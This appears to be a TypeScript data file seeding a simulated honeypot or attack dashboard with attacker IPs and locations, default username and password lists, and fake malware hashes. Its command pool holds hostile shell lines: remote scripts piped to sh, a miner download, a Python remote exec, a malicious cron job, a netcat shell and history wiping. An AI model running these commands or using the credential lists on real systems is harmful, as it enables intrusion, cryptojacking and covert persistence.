export interface AttackerProfile {
  ip: string;
  country: string;
  countryCode: string;
  lat: number;
  lon: number;
}

export const attackerPool: AttackerProfile[] = [
  { ip: "185.220.101.45", country: "Russia", countryCode: "RU", lat: 55.7558, lon: 37.6173 },
  { ip: "218.92.0.158", country: "China", countryCode: "CN", lat: 39.9042, lon: 116.4074 },
  { ip: "104.244.75.12", country: "United States", countryCode: "US", lat: 37.0902, lon: -95.7129 },
  { ip: "45.143.203.14", country: "Netherlands", countryCode: "NL", lat: 52.1326, lon: 5.2913 },
  { ip: "80.82.77.33", country: "Germany", countryCode: "DE", lat: 51.1657, lon: 10.4515 },
  { ip: "177.53.111.90", country: "Brazil", countryCode: "BR", lat: -14.2350, lon: -51.9253 },
  { ip: "103.241.12.44", country: "India", countryCode: "IN", lat: 20.5937, lon: 78.9629 },
  { ip: "91.241.201.5", country: "Ukraine", countryCode: "UA", lat: 48.3794, lon: 31.1656 },
  { ip: "14.161.44.180", country: "Vietnam", countryCode: "VN", lat: 14.0583, lon: 108.2772 },
  { ip: "88.230.12.87", country: "Turkey", countryCode: "TR", lat: 38.9637, lon: 35.2433 },
  { ip: "31.42.188.101", country: "Iran", countryCode: "IR", lat: 32.4279, lon: 53.6880 },
  { ip: "109.166.128.23", country: "Romania", countryCode: "RO", lat: 45.9432, lon: 24.9668 },
  { ip: "82.165.19.41", country: "United Kingdom", countryCode: "GB", lat: 55.3781, lon: -3.4360 },
  { ip: "210.123.45.67", country: "South Korea", countryCode: "KR", lat: 35.9078, lon: 127.7669 },
  { ip: "118.200.41.112", country: "Singapore", countryCode: "SG", lat: 1.3521, lon: 103.8198 }
];

export const usernamePool: string[] = [
  "admin",
  "root",
  "user",
  "ubuntu",
  "pi",
  "support",
  "administrator",
  "oracle",
  "postgres",
  "mysql",
  "ftpuser",
  "guest",
  "test",
  "operator",
  "git",
  "docker",
  "jenkins",
  "node",
  "sales",
  "service"
];

export const passwordPool: string[] = [
  "123456",
  "password",
  "admin",
  "12345678",
  "root",
  "1234",
  "qwerty",
  "admin123",
  "pass123",
  "12345",
  "login",
  "secret",
  "default",
  "support",
  "ubuntu",
  "raspberry",
  "123456789",
  "password123",
  "oracle",
  "postgres"
];

export const commandPool: string[] = [
  "wget http://185.220.101.45/sh/update.sh -O - | sh",
  "curl -O http://218.92.0.158/bin/miner && chmod +x miner && ./miner -o pool.mine.co -u dev",
  "cat /etc/passwd",
  "uname -a",
  "ls -la /tmp/.X11-unix/",
  "whoami",
  "rm -rf /tmp/.logs && mkdir /tmp/.logs && cd /tmp/.logs",
  "chmod 777 /var/tmp/syslog-daemon",
  "python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://80.82.77.33/p').read())\"",
  "history -c",
  "echo \"*/5 * * * * curl -s http://45.143.203.14/cron.sh | sh\" > /tmp/cron && crontab /tmp/cron",
  "cat /proc/cpuinfo | grep name | uniq",
  "ps aux | grep -i miner",
  "nc -lvp 4444 -e /bin/sh"
];

export const fileDownloadPool = [
  { shasum: "f6e87f2122bdf7cd1a97d8cf6ec32b3504fb42ab94456930ef0fc129b87df8eb", filename: "x86_64_botnet" },
  { shasum: "3b01a2b1664fb02de8b70bf1369527cf6bc3409ef1df986bc0fc12a45d0fc222", filename: "arm7_miner" },
  { shasum: "77a83212720d207ecbcfa99201a4fb4ab76fc6d9341f23a1a5b8214fa38de3b2", filename: "mips_exploit" },
  { shasum: "bca1a5d6cd96417fb75f1480d2822a1abfb7e8aa691de5c94291f038d1ee34b2", filename: "dropper.sh" },
  { shasum: "44abcf6cd3c3d3d6bc3a12338c2081fbc03e8bb58c30c30a47d2f39c09d3bdfd", filename: "config.json" }
];
